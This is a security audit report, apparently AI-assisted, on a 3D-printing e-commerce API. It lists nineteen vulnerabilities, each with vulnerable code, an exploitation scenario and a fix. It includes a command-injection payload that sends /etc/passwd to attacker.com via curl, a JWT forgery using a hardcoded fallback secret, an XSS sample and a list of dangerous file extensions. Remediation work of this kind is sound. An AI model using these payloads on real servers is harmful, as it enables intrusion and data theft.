# 🔴 RoboHatch Platform — Deep Security Audit Report
**Date:** March 15, 2026  
**Auditor:** Senior Penetration Tester / Security Auditor (AI-assisted)  
**Scope:** Full-stack production e-commerce platform (Next.js frontend + Express/Node.js API + MySQL/Prisma)  
**Methodology:** OWASP Top 10, STRIDE, manual code review, logic-flow analysis  

---

## Executive Summary

| Severity | Count |
|----------|-------|
| 🔴 Critical | 4 |
| 🟠 High | 5 |
| 🟡 Medium | 6 |
| 🔵 Low | 4 |
| **Total** | **19** |

> **Overall Risk Rating: CRITICAL** — Multiple exploitable vulnerabilities exist that can lead to Remote Code Execution, full database exfiltration, and payment fraud.

---

## 🔴 CRITICAL Vulnerabilities

---

### VULN-01 — Remote Code Execution via Unauthenticated Command Injection

- **Severity:** 🔴 Critical  
- **File:** `apps/api/src/controllers/prusaSlicer.controller.ts` (lines 1–35) + `apps/api/src/routes/index.ts` (lines 7–8) + `apps/api/src/services/prusaSlicer.service.ts` (lines 12–25)  
- **Category:** Injection (OWASP A03) + Broken Access Control (OWASP A01)

#### Vulnerable Code

```ts
// prusaSlicer.controller.ts — No authentication, no sanitization
export async function sliceModel(req: Request, res: Response) {
  const { filePath } = req.body;          // ← user-controlled
  const result = await runPrusaSlicer(filePath); // ← passed to shell
}

// prusaSlicer.service.ts — shell exec with unsanitized input
const command = `prusa-slicer --load "${configPath}" "${filePath}" --export-gcode --output "${gcodePath}"`;
exec(command, (error) => { ... });         // ← OS command injection
```

```ts
// routes/index.ts — route is UNAUTHENTICATED and mounted on /api/prusa/slice
router.use("/prusa", prusaRoutes);
```

```ts
// app.ts — the whole prusa router is public
import testRoutes from "./routes/test.route";
// routes/index.ts is NOT mounted on app.ts explicitly,
// but prusaSlicer.routes.ts is imported by index.ts which is already public
```

#### Exploitation Scenario

An unauthenticated attacker sends:
```
POST /api/prusa/slice
{ "filePath": "/tmp/x\"; curl https://attacker.com/$(cat /etc/passwd | base64); echo \"" }
```
The shell expands to:
```sh
prusa-slicer --load "config.ini" "/tmp/x"; curl https://attacker.com/...
```
This achieves full RCE on the server — the attacker can exfiltrate env vars (API keys, DB credentials, JWT secrets), install backdoors, or escalate further.

#### Secure Fix

```ts
// prusaSlicer.service.ts — use execFile() instead of exec() to avoid shell interpretation
import { execFile } from "child_process";
import path from "path";

export async function runPrusaSlicer(filePath: string) {
  // Validate that the path is inside the expected temp directory
  const allowedDir = process.env.UPLOAD_DIR || '/tmp/stl-uploads';
  const resolved = path.resolve(filePath);
  if (!resolved.startsWith(path.resolve(allowedDir))) {
    throw new Error('Invalid file path: outside allowed directory');
  }

  return new Promise((resolve, reject) => {
    const configPath = path.join(process.cwd(), "src/slicer/default_config.ini");
    const ext = path.extname(resolved);
    const gcodePath = resolved.slice(0, -ext.length) + ".gcode";

    // execFile does NOT invoke a shell — arguments are passed directly to the binary
    execFile("prusa-slicer", [
      "--load", configPath,
      resolved,
      "--export-gcode",
      "--output", gcodePath,
    ], (error) => { /* ... */ });
  });
}
```

```ts
// prusaSlicer.controller.ts — add authMiddleware + adminMiddleware
// routes/prusaSlicer.routes.ts
import { authMiddleware, adminMiddleware } from '../middlewares/auth.middleware';
router.post("/slice", authMiddleware, adminMiddleware, sliceModel);
```

---

### VULN-02 — Unauthenticated Full Database Dump Endpoint

- **Severity:** 🔴 Critical  
- **File:** `apps/api/src/routes/test.route.ts` (lines 1–12)  
- **Category:** Broken Access Control (OWASP A01) + Sensitive Data Exposure (OWASP A02)

#### Vulnerable Code

```ts
// test.route.ts — no authentication whatsoever
router.get("/db-test", async (_, res) => {
  const users = await prisma.user.findMany();  // ← ALL users, ALL fields
  res.json({ success: true, users });           // ← including password hashes, emails
});
```

```ts
// app.ts — mounted OUTSIDE /api so even the general rate limiter is bypassed
app.use("/test", testRoutes);
```

#### Exploitation Scenario

Any attacker simply calls:
```
GET https://api.robohatch.in/test/db-test
```
Response contains ALL user records including hashed passwords, emails, and roles. Password hashes (bcrypt) can be cracked offline, and the attacker learns every admin email for targeted attacks.

#### Secure Fix

**Immediate action — delete or protect the route:**
```ts
// Option A: Delete the file entirely (recommended for production)
// Option B: Restrict for development only
router.get("/db-test", async (_, res) => {
  if (process.env.NODE_ENV !== 'development') {
    return res.status(404).json({ message: 'Not found' });
  }
  // Never return all users even in development — just a ping
  const count = await prisma.user.count();
  res.json({ success: true, userCount: count });
});
```

---

### VULN-03 — Hardcoded JWT Fallback Secret

- **Severity:** 🔴 Critical  
- **File:** `apps/api/src/config/index.ts` (line 5)  
- **Category:** Cryptographic Failures (OWASP A02) + Identification & Authentication Failures (OWASP A07)

#### Vulnerable Code

```ts
// config/index.ts
export const config = {
  jwtSecret: process.env.JWT_SECRET || 'your-secret-key',  // ← hardcoded fallback
};
```

#### Exploitation Scenario

If `JWT_SECRET` env var is missing or empty (common in misconfigured deployments, CI/CD, Docker containers with incomplete env), the application silently falls back to `'your-secret-key'`, which:
1. Is publicly known (visible in this codebase and any fork).
2. Allows anyone to forge valid JWT tokens and authenticate as any user including admins.

**Attack:** Attacker forges a token with `{ userId: "any-id", email: "admin@robohatch.in", role: "ADMIN" }` signed with `'your-secret-key'`.

> Note: `auth.service.ts` correctly throws if `JWT_SECRET` is missing. However, `config/index.ts` still exports a config object with this fallback — if any code imports from `config/index.ts` instead of `process.env.JWT_SECRET` directly, the fallback is used silently.

#### Secure Fix

```ts
// config/index.ts
if (!process.env.JWT_SECRET) {
  throw new Error('FATAL: JWT_SECRET environment variable is required');
}

export const config = {
  jwtSecret: process.env.JWT_SECRET,  // No fallback — fail loudly
};
```

---

### VULN-04 — Privilege Escalation via `updateOrderStatus` Without Role Check

- **Severity:** 🔴 Critical  
- **File:** `apps/api/src/services/order.service.ts` (lines 97–125) + `apps/api/src/routes/order.route.ts` (line 22)  
- **Category:** Broken Access Control (OWASP A01)

#### Vulnerable Code

```ts
// order.route.ts
router.put('/:id/status', adminMiddleware, orderController.updateOrderStatus.bind(orderController));
// ✅ adminMiddleware is present on the route

// order.service.ts — updateOrderStatus
async updateOrderStatus(orderId: string, userId: string, status: OrderStatus) {
  const order = await this.getOrderById(orderId, userId);  // ← validates userId owns order
  // ...
}
```

```ts
// order.controller.ts — passes req.userId (not from token, from AuthRequest interface)
interface AuthRequest extends Request {
  userId?: string;  // ← NOT populated by authMiddleware which sets req.user.userId
}

async updateOrderStatus(req: AuthRequest, res: Response) {
  const userId = req.userId!;  // ← always undefined! Non-null assertion on undefined
```

#### Exploitation Scenario

Because `AuthRequest` in `order.controller.ts` uses `req.userId` but `authMiddleware` populates `req.user.userId`, the `userId` is **always `undefined`**. The `!` non-null assertion suppresses TypeScript's warning. `getOrderById(orderId, undefined)` will fail the ownership check `order.userId !== userId` against `undefined`, potentially throwing "Unauthorized access" or in edge cases (if `order.userId` happens to be undefined) granting access.

More critically, **there are actually two `AuthRequest` interfaces** — one in `auth.middleware.ts` with `user.userId` and one in `order.controller.ts` with `userId` — creating a disconnect that could cause unexpected auth bypasses depending on how middleware chains.

#### Secure Fix

```ts
// order.controller.ts — fix interface mismatch
import { AuthRequest } from '../middlewares/auth.middleware'; // use shared interface

async updateOrderStatus(req: Request, res: Response) {
  const userId = (req as AuthRequest).user?.userId; // consistent with auth middleware
  if (!userId) {
    return res.status(401).json({ success: false, message: 'Unauthorized' });
  }
  // ...
}
```

---

## 🟠 HIGH Vulnerabilities

---

### VULN-05 — MIME-Type Bypass for 3D File Upload (Polyglot File Attack)

- **Severity:** 🟠 High  
- **File:** `apps/api/src/middlewares/upload3d.middleware.ts` (lines 41–57)  
- **Category:** Security Misconfiguration (OWASP A05) + File Upload Vulnerability

#### Vulnerable Code

```ts
fileFilter: (_, file, cb) => {
  const allowedMimes = [
    'application/octet-stream', // ← Extremely broad — covers ALL binary files
    'model/stl',
    // ...
  ];
  const allowedExtensions = ['.stl', '.3mf', '.obj', '.gcode'];
  const fileExtension = '.' + file.originalname.split('.').pop()?.toLowerCase();

  // OR condition — extension check alone is enough to bypass MIME check
  if (allowedMimes.includes(file.mimetype) || allowedExtensions.includes(fileExtension)) {
    cb(null, true);
  }
```

#### Exploitation Scenario

1. An attacker renames a PHP/Python webshell to `shell.stl` and uploads it.
2. The OR condition passes because `.stl` extension matches.
3. `application/octet-stream` matches any binary anyway.
4. The file lands in S3 — while direct execution there is unlikely, the file can be used in SSRF, reflected XSS via URL, or as a polyglot attack payload.
5. More critically: the file extension is extracted from `file.originalname` which is **user-controlled** — a file named `evil.stl.php` with `pop()` gives `.php` normally, but crafted filenames with double extensions can bypass this.

Also: `fileExtension` extraction via `split('.').pop()` on `evil.stl.php` gives `.php` — which is rejected — but `evil.php.stl` gives `.stl` and is accepted!

#### Secure Fix

```ts
import { magic } from 'file-type'; // use magic-bytes library

fileFilter: async (_, file, cb) => {
  // Validate extension first
  const allowedExtensions = ['.stl', '.3mf', '.obj', '.gcode'];
  const parts = file.originalname.split('.');
  if (parts.length < 2) return cb(new Error('Invalid filename'));
  const ext = '.' + parts[parts.length - 1].toLowerCase();
  
  // Reject double-extension names (e.g., evil.php.stl)
  if (parts.length > 2) {
    const secondLastExt = '.' + parts[parts.length - 2].toLowerCase();
    const dangerousExts = ['.php', '.js', '.py', '.rb', '.sh', '.exe', '.bat', '.cmd'];
    if (dangerousExts.some(e => secondLastExt === e)) {
      return cb(new Error('Suspicious filename rejected'));
    }
  }

  if (!allowedExtensions.includes(ext)) {
    return cb(new Error('Only 3D files (.stl, .3mf, .obj, .gcode) are allowed'));
  }
  
  // Strict MIME check — no octet-stream wildcard
  const strictAllowedMimes = ['model/stl', 'model/obj', 'application/sla'];
  if (file.mimetype !== 'application/octet-stream' && !strictAllowedMimes.includes(file.mimetype)) {
    return cb(new Error('Invalid MIME type'));
  }
  
  cb(null, true);
},
```

---

### VULN-06 — Unsanitized User Input in Custom Design Fields (Stored Data Risk)

- **Severity:** 🟠 High  
- **File:** `apps/api/src/controllers/customDesign.controller.ts` (lines ~125–160)  
- **Category:** Input Validation (OWASP A03)

#### Vulnerable Code

```ts
const {
  name,          // ← no length limit, no special-char sanitization
  description,   // ← no length limit
  material,      // ← no whitelist check
  color,         // ← no whitelist check
  size,
  quantity,
  infillPercentage,
  layerHeight,
} = req.body;

if (!name || !material || !color) {
  // Only checks presence, not content
}

const materialLower = material.toLowerCase(); // used as key in getMaterialCostPerGram
```

```ts
// getMaterialCostPerGram — prototype pollution risk if material chosen cleverly
const costs: Record<string, number> = { pla: 4, abs: 7, ... };
return costs[material] || 4;  // if material = '__proto__', returns undefined → defaults to 4
```

#### Exploitation Scenario

1. **Price manipulation:** Attacker sends `material: "pla\x00"` or `material: "   pla   "` — the `.toLowerCase()` call won't clean nullbytes or extra whitespace before the lookup. They could also craft a material string that doesn't match any key to always get the cheapest price (default 4 ₹/g).
2. **Stored XSS:** If `name` or `description` is ever rendered in an admin panel without escaping (e.g., React `dangerouslySetInnerHTML`, which we couldn't fully rule out in the admin frontend), an attacker inputs `<script>document.cookie</script>`.
3. **DoS via large payloads:** No max length check on `description` — a 10MB string in `description` could cause memory pressure in the Prisma `create` call.

#### Secure Fix

```ts
import { z } from 'zod';

const ALLOWED_MATERIALS = ['pla', 'abs', 'petg', 'tpu'] as const;
const ALLOWED_COLORS = ['red', 'blue', 'black', 'white', 'green', 'yellow', 'grey', 'orange', 'custom'] as const;

const customDesignSchema = z.object({
  name: z.string().min(1).max(200).trim(),
  description: z.string().max(2000).trim().optional(),
  material: z.enum(ALLOWED_MATERIALS),
  color: z.string().min(1).max(50).trim().regex(/^[a-zA-Z0-9\s#-]+$/),
  size: z.string().max(50).trim().optional(),
  quantity: z.number().int().min(1).max(1000),
  infillPercentage: z.number().min(5).max(100).optional(),
  layerHeight: z.number().min(0.1).max(0.4).optional(),
});
```

---

### VULN-07 — No Rate Limiting on Webhook Endpoint (DoS / Replay Attack)

- **Severity:** 🟠 High  
- **File:** `apps/api/src/app.ts` (lines ~188–192)  
- **Category:** Security Misconfiguration (OWASP A05)

#### Vulnerable Code

```ts
// app.ts — explicit comment says NO rate limiting
// 🔒 WEBHOOK ROUTES: No auth required, signature verification in controller
// IMPORTANT: These must NOT have authMiddleware or rate limiting
app.use("/api/webhook", webhookRoutes);
```

#### Exploitation Scenario

An attacker who obtained or guessed a previously valid webhook signature (or is replaying captured webhook payloads) can flood the endpoint at millions of requests per minute. The `prisma.payment.findUnique` + `prisma.$transaction` in each webhook call will hammer the database, causing a DoS for legitimate users.

Additionally, there is **no replay protection** — a valid Razorpay webhook body+signature can be replayed indefinitely since only the signature is verified, not the timestamp.

#### Secure Fix

```ts
// app.ts — add a loose rate limiter that only blocks obvious abuse
const webhookRateLimiter = rateLimit({
  windowMs: 60 * 1000,
  max: 500, // Razorpay sends at most a handful per minute for normal traffic
  keyGenerator: (req) => req.headers['x-razorpay-signature'] as string || req.ip || 'unknown',
});
app.use("/api/webhook", webhookRateLimiter, webhookRoutes);

// webhook.controller.ts — add timestamp check for replay protection
const webhookTimestamp = req.headers['x-razorpay-event-id'] as string;
// Check if this event ID was already processed (store in Redis or DB)
const alreadyProcessed = await prisma.processedWebhook.findUnique({
  where: { eventId: webhookTimestamp }
});
if (alreadyProcessed) return res.status(200).json({ success: true });
```

---

### VULN-08 — Order Status Manipulation by Regular Users

- **Severity:** 🟠 High  
- **File:** `apps/api/src/services/order.service.ts` (lines 104–130)  
- **Category:** Broken Access Control (OWASP A01) + Business Logic

#### Vulnerable Code

```ts
// order.route.ts — PUT /:id/status is admin-only ✅
router.put('/:id/status', adminMiddleware, ...);

// BUT order.service.ts validates userId from req.userId (always undefined - see VULN-04)
async updateOrderStatus(orderId: string, userId: string, status: OrderStatus) {
  const order = await this.getOrderById(orderId, userId);  // userId is undefined
  // validTransitions allows:
  PAID: [OrderStatus.PROCESSING, OrderStatus.SHIPPED, OrderStatus.CANCELLED],
  // A user who gets past the middleware can cancel a PAID order → stock restored → refund claimed
```

#### Exploitation Scenario

Despite the `adminMiddleware`, due to the `userId` being `undefined` (VULN-04), the ownership check `order.userId !== userId` compares `string !== undefined` which is always `true` — meaning **every request fails`** right now. However, if VULN-04 is fixed without updating the service logic, an admin could cancel any user's PAID order (since `userId` matches the admin's ID, not the order owner's).

Furthermore, valid users reaching the endpoint could manipulate their own order status (PAID → CANCELLED → stock restored) and attempt to claim a physical refund without it being logged correctly.

#### Secure Fix

```ts
// Separate admin update from user update; admins should not be bound by userId ownership
async adminUpdateOrderStatus(orderId: string, adminId: string, status: OrderStatus) {
  const order = await prisma.order.findUnique({ where: { id: orderId } });
  if (!order) throw new Error('Order not found');
  // No userId ownership check for admins — but log the admin action
  await prisma.auditLog.create({ data: { action: 'ORDER_STATUS_CHANGE', adminId, orderId, newStatus: status }});
  // ...
}
```

---

### VULN-09 — Unprotected `limit` / `offset` Parameters (DoS via Large Queries)

- **Severity:** 🟠 High  
- **File:** `apps/api/src/controllers/order.controller.ts` (lines 57–65) + `apps/api/src/controllers/customDesign.controller.ts` (getUserCustomDesigns)  
- **Category:** Security Misconfiguration (OWASP A05)

#### Vulnerable Code

```ts
// order.controller.ts
const limit = parseInt(req.query.limit as string) || 10;
const offset = parseInt(req.query.offset as string) || 0;
const result = await orderService.getUserOrders(userId, limit, offset);
// No upper bound on limit!
```

```ts
// customDesign.controller.ts — getUserCustomDesigns
const { limit = 20, offset = 0 } = req.query;
await prisma.customDesign.findMany({
  take: Number(limit),  // ← no max cap
  skip: Number(offset),
});
```

#### Exploitation Scenario

An authenticated attacker sends `GET /api/orders?limit=9999999` — the database executes `LIMIT 9999999`, pulling the entire orders table into memory, potentially causing OOM on the server or excessive DB load.

#### Secure Fix

```ts
const MAX_LIMIT = 100;
const limit = Math.min(Math.max(1, parseInt(req.query.limit as string) || 10), MAX_LIMIT);
const offset = Math.max(0, parseInt(req.query.offset as string) || 0);
```

---

## 🟡 MEDIUM Vulnerabilities

---

### VULN-10 — CORS Allows All Pre-Authenticated Requests (No Origin = Accepted)

- **Severity:** 🟡 Medium  
- **File:** `apps/api/src/app.ts` (lines 65–68)  
- **Category:** Security Misconfiguration (OWASP A05) / CSRF Adjacent

#### Vulnerable Code

```ts
origin: (origin, callback) => {
  // Allow requests with no origin (mobile apps, Postman, etc.)
  if (!origin) return callback(null, true);  // ← Allows any non-browser client
```

#### Exploitation Scenario

Any server-side script (attacker's proxy, cURL, etc.) can make requests without an `Origin` header and be fully accepted. Combined with `credentials: true`, this means any server-to-server request bypasses CORS entirely, enabling SSRF-style cross-origin calls from a compromised internal service.

#### Secure Fix

```ts
if (!origin) {
  // In production, require origin for all requests
  if (process.env.NODE_ENV === 'production') {
    return callback(new Error('Origin required in production'));
  }
  return callback(null, true); // dev only
}
```

---

### VULN-11 — Missing CSRF Protection on State-Changing Endpoints

- **Severity:** 🟡 Medium  
- **File:** `apps/api/src/app.ts` + all POST/PUT/DELETE routes  
- **Category:** CSRF (OWASP A01)

#### Analysis

The application uses `sameSite: 'none'` for cookies in production (to support cross-domain from Vercel frontend to Railway backend). This **disables the browser's built-in SameSite CSRF protection**. There is no CSRF token middleware anywhere in the codebase.

#### Exploitation Scenario

Since `sameSite: 'none'` is set, a malicious third-party site can craft a form that submits to `https://api.robohatch.in/api/cart/items`, and the user's `auth_token` cookie will be automatically included. This allows CSRF attacks for adding items to cart, placing orders, etc.

#### Secure Fix

```ts
// Install csurf or use double-submit cookie pattern
// For API: use custom CSRF token in X-CSRF-Token header
// Middleware approach:
app.use((req, res, next) => {
  if (['POST', 'PUT', 'DELETE', 'PATCH'].includes(req.method)) {
    const csrfHeader = req.headers['x-requested-with'];
    if (csrfHeader !== 'XMLHttpRequest' && !req.headers['x-csrf-token']) {
      return res.status(403).json({ success: false, message: 'CSRF protection: missing header' });
    }
  }
  next();
});
```

---

### VULN-12 — Error Message Leaks Stack Traces in Development Check Gap

- **Severity:** 🟡 Medium  
- **File:** `apps/api/src/controllers/customDesign.controller.ts` (near end of function)  
- **Category:** Security Misconfiguration (OWASP A05)

#### Vulnerable Code

```ts
res.status(500).json({
  success: false,
  message: 'Failed to create custom design request',
  error: process.env.NODE_ENV === 'development' ? error.message : undefined,
});
```

And in `admin.controller.ts`:
```ts
return res.status(500).json({
  success: false,
  message: 'Failed to fetch dashboard statistics',
  error: error.message,  // ← NO environment check! Always leaks to any user
});
```

#### Exploitation Scenario

Any authenticated user who triggers an error in dashboard stats gets the raw `error.message` which can include SQL fragments, file paths, connection strings, or internal logic details, helping an attacker fingerprint the system.

#### Secure Fix

```ts
// admin.controller.ts — fix unconditional error leak
return res.status(500).json({
  success: false,
  message: 'Failed to fetch dashboard statistics',
  // Never return raw error to client in production
  ...(process.env.NODE_ENV === 'development' && { error: error.message }),
});
```

---

### VULN-13 — File Extension Extraction via `String.replace()` is Unreliable

- **Severity:** 🟡 Medium  
- **File:** `apps/api/src/services/prusaSlicer.service.ts` (lines 12–15)  
- **Category:** Injection

#### Vulnerable Code

```ts
const ext = path.extname(filePath);
const gcodePath = filePath.replace(ext, ".gcode");
// String.replace() replaces FIRST match only
// If filePath = "/tmp/uploads/report.stl.stl", this gives "/tmp/uploads/report.gcode.stl"
// If filePath somehow contains ".stl" in the directory name: /tmp/stl-files/model.stl
// → gcodePath = "/tmp/gcode-files/model.stl" (wrong!)
```

#### Secure Fix

```ts
const gcodePath = filePath.slice(0, filePath.length - ext.length) + ".gcode";
// Or:
const gcodePath = path.join(path.dirname(filePath), path.basename(filePath, ext) + ".gcode");
```

---

### VULN-14 — JWT Token Expiry is 7 Days Without Refresh or Revocation

- **Severity:** 🟡 Medium  
- **File:** `apps/api/src/services/auth.service.ts`  
- **Category:** Identification & Authentication Failures (OWASP A07)

#### Analysis

Tokens last 7 days with **no token blacklist or revocation mechanism**. If a user's session is stolen, the attacker has a 7-day window with no ability for the victim to invalidate it (beyond manually clearing cookies). There is no `jti` (JWT ID) claim for tracking issued tokens.

#### Secure Fix

```ts
// Add jti to token; store issued tokens in Redis with TTL
const jti = crypto.randomUUID();
const token = jwt.sign({ userId, email, role, jti }, JWT_SECRET, { expiresIn: '15m' }); // short-lived
// Implement refresh token rotation with Redis blacklist for revoked tokens
```

---

### VULN-15 — S3 URL Exposure in API Responses Includes Internal Keys

- **Severity:** 🟡 Medium  
- **File:** `apps/api/src/controllers/customDesign.controller.ts` + `product.controller.ts`  
- **Category:** Sensitive Data Exposure (OWASP A02)

#### Vulnerable Code

```ts
// customDesignResponse includes direct S3 URL of the user's design file
fileUrl: customDesign.fileUrl,  // https://bucket.s3.eu-north-1.amazonaws.com/3d-designs/...
```

#### Exploitation Scenario

S3 URLs are returned in API responses and can be enumerated. If the S3 bucket is **publicly readable** (a common misconfiguration), any user's 3D design files can be downloaded by anyone who knows the URL format. Since URLs include predictable timestamps, enumeration is feasible.

#### Secure Fix

```ts
// Use S3 presigned URLs with short expiry instead of permanent public URLs
import { GetObjectCommand } from '@aws-sdk/client-s3';
import { getSignedUrl } from '@aws-sdk/s3-request-presigner';

const presignedUrl = await getSignedUrl(s3, new GetObjectCommand({
  Bucket: process.env.AWS_S3_BUCKET,
  Key: s3Key,
}), { expiresIn: 3600 }); // 1 hour expiry
```

---

## 🔵 LOW Vulnerabilities

---

### VULN-16 — Auth Rate Limiter Removed from Auth Routes

- **Severity:** 🔵 Low  
- **File:** `apps/api/src/app.ts` (comment near line 178)  
- **Category:** Identification & Authentication Failures (OWASP A07)

#### Vulnerable Code

```ts
// Authentication routes - only general rate limiting applied via /api
// Removed authRateLimiter to prevent 405 errors during deployment
app.use("/api/auth", authRoutes);
```

The `authRateLimiter` (15 minutes / 20 requests) was intentionally removed. The general rate limiter allows 100 requests/15min per IP — sufficient for brute force.

#### Secure Fix

Investigate and fix the 405 root cause instead of removing the limiter. Likely caused by CORS preflight OPTIONS not being excluded:
```ts
// authRateLimiter already has: skip: (req) => req.method === 'OPTIONS'
// Re-enable it:
app.use("/api/auth", authRateLimiter, authRoutes);
```

---

### VULN-17 — Console Logs Emit Sensitive User Data

- **Severity:** 🔵 Low  
- **File:** `apps/api/src/services/auth.service.ts` (lines 75, 111, 164, 270)  
- **Category:** Security Logging and Monitoring Failures (OWASP A09)

#### Vulnerable Code

```ts
console.log('✅ User registered:', user.email);       // logs PII to stdout
console.log('✅ User logged in:', user.email);         // logs on each auth
console.log(`⚠️  Password reset requested for non-existent email: ${normalizedEmail}`);
```

#### Risk

Server logs are often forwarded to third-party services (Sentry, Datadog, Railway logs). Logging email addresses on every login/register creates a PII audit trail that may violate GDPR/DPDP Act 2023 (India) and can be accessed by log service employees.

#### Secure Fix

```ts
// Replace with anonymized or hash-based identifiers
console.log('✅ User registered: ID=' + user.id); // No PII in logs
// Or use structured logging with PII masking
```

---

### VULN-18 — Missing `fieldname` Check on Multer Uploads

- **Severity:** 🔵 Low  
- **File:** `apps/api/src/middlewares/upload.middleware.ts` + `upload3d.middleware.ts`  
- **Category:** Input Validation

#### Analysis

Multer does not validate the `fieldname` of incoming files. An attacker can upload a file under an unexpected field name (e.g., `malware` instead of `images`) and it may still be processed by multer's `fileFilter`. While unlikely to cause direct harm, unexpected field names can indicate probing behavior.

---

### VULN-19 — `adm-zip` Dependency (Potential Zip Slip if Used for 3MF Parsing)

- **Severity:** 🔵 Low  
- **File:** `apps/api/package.json` — `"adm-zip": "^0.5.16"`  
- **Category:** Vulnerable Components (OWASP A06)

#### Analysis

`adm-zip` versions before `0.5.2` have a **Zip Slip** vulnerability (CVE-2018-1002204) allowing path traversal via crafted `.zip` files. Version `^0.5.16` is patched. However, `.3mf` files are ZIP archives — if `adm-zip` is used to extract `.3mf` contents, ensure that extracted file paths are validated for path traversal:

```ts
// When extracting, validate each entry path
zip.getEntries().forEach(entry => {
  const entryPath = path.resolve(outputDir, entry.entryName);
  if (!entryPath.startsWith(path.resolve(outputDir))) {
    throw new Error('Zip Slip attack detected in 3MF file');
  }
});
```

---

## Business Logic Vulnerability Summary

| Issue | Risk | Details |
|-------|------|---------|
| **Price not re-validated server-side for products in cart** | High | Cart items store `product.price` at add-time, not at checkout. If product price changes between add-to-cart and order, the old price is used. |
| **Custom design price is client-influenceable via quantity** | High | `estimatedPrice = rawCost * quantityInt` — `quantity` comes from `req.body` as a string, `parseInt(quantity) \|\| 1`. A NaN quantity defaults to 1 (safe), but passing `quantity=0` gives `parseInt('0') = 0` → estimatedPrice = 0 potentially for free designs. |
| **No maximum order value check** | Medium | No cap on the number of items or total order value — enables automated large-order stress attacks. |
| **Stock decrement happens at order creation, not payment** | Medium | Stock is reserved at order creation (`CREATED` status). If payment is never made and order isn't cancelled, stock remains unavailable indefinitely. There is no time-bound cleanup job visible in the codebase. |

---

## Dependency Vulnerability Analysis

| Package | Version | Status | Notes |
|---------|---------|--------|-------|
| `express` | ^4.22.1 | ⚠️ Check | Express 4.x; no known critical CVEs in 4.22.x but 5.0 is released |
| `jsonwebtoken` | ^9.0.3 | ✅ Current | JWT alg:none attack fixed in 9.x |
| `multer` | ^2.0.2 | ✅ Current | 2.x series, recent |
| `bcrypt` | ^6.0.0 | ✅ Current | 12 rounds — good |
| `helmet` | ^8.1.0 | ✅ Current | Latest major |
| `adm-zip` | ^0.5.16 | ✅ Patched | Zip Slip patched in 0.5.2+ |
| `@sentry/node` | ^7.100.0 | ⚠️ Outdated | Sentry 8.x is current; 7.x may have minor issues |
| `cors` | ^2.8.6 | ⚠️ Stale | No updates since 2.8.5 (2018); consider fork or alternative |
| `mysql2` | ^3.16.2 | ✅ Current | Recent version |
| `stl-parser` | ^0.11.1 | ⚠️ Unknown | Unmaintained package; review source for parser DoS risks |
| `react-hot-toast` | ^2.6.0 | ⚠️ Wrong pkg | This is a **frontend** library in the **API** package — dead dependency, remove it |

---

## Priority Remediation Plan

### Immediate (Before Next Deployment)

1. **[VULN-02]** Delete or restrict `/test/db-test` endpoint — 30 minutes
2. **[VULN-01]** Switch `exec()` to `execFile()` and add path validation — 2 hours
3. **[VULN-01]** Add `authMiddleware + adminMiddleware` to `/api/prusa/slice` — 15 minutes
4. **[VULN-03]** Remove `|| 'your-secret-key'` fallback from `config/index.ts` — 5 minutes

### Short Term (This Sprint)

5. **[VULN-04]** Fix `AuthRequest` interface inconsistency in `order.controller.ts`
6. **[VULN-09]** Cap `limit` parameter at 100 in all paginated endpoints
7. **[VULN-12]** Fix unconditional `error.message` leak in `admin.controller.ts`
8. **[VULN-05]** Harden file upload validation — reject double-extension names
9. **[VULN-06]** Add Zod validation schema for custom design inputs

### Medium Term (Next Sprint)

10. **[VULN-11]** Implement CSRF protection (custom header / origin check)
11. **[VULN-14]** Shorten JWT expiry + implement refresh token rotation
12. **[VULN-15]** Replace S3 public URLs with presigned URLs (expiring)
13. **[VULN-10]** Require `Origin` header in production CORS policy
14. **[VULN-07]** Add webhook rate limiter + replay protection via event ID deduplication
15. **[VULN-08]** Separate admin order update from user order update in service layer
16. **[VULN-16]** Re-enable auth rate limiter after fixing OPTIONS handling
17. **[VULN-17]** Replace PII-containing logs with anonymized IDs
18. **[VULN-19]** Add Zip Slip validation when extracting 3MF files

---

## Appendix — Files Reviewed

| File | Issues Found |
|------|-------------|
| `apps/api/src/routes/test.route.ts` | VULN-02 |
| `apps/api/src/routes/index.ts` | Part of VULN-01 |
| `apps/api/src/routes/prusaSlicer.routes.ts` | VULN-01 |
| `apps/api/src/controllers/prusaSlicer.controller.ts` | VULN-01 |
| `apps/api/src/services/prusaSlicer.service.ts` | VULN-01, VULN-13 |
| `apps/api/src/config/index.ts` | VULN-03 |
| `apps/api/src/controllers/order.controller.ts` | VULN-04, VULN-09 |
| `apps/api/src/services/order.service.ts` | VULN-04, VULN-08 |
| `apps/api/src/routes/order.route.ts` | VULN-04, VULN-08 |
| `apps/api/src/middlewares/upload3d.middleware.ts` | VULN-05, VULN-18 |
| `apps/api/src/middlewares/uploadCustomPhoto.middleware.ts` | VULN-18 |
| `apps/api/src/controllers/customDesign.controller.ts` | VULN-06, VULN-09, VULN-12, VULN-15 |
| `apps/api/src/app.ts` | VULN-07, VULN-10, VULN-11, VULN-16 |
| `apps/api/src/controllers/admin.controller.ts` | VULN-12 |
| `apps/api/src/services/auth.service.ts` | VULN-14, VULN-17 |
| `apps/api/src/controllers/webhook.controller.ts` | VULN-07 |
| `apps/api/src/controllers/product.controller.ts` | VULN-15 |
| `apps/api/package.json` | VULN-19 |

---

*Report generated via static code analysis and manual code review. Dynamic testing (fuzzing, pentesting on live environment) is recommended as a follow-up.*
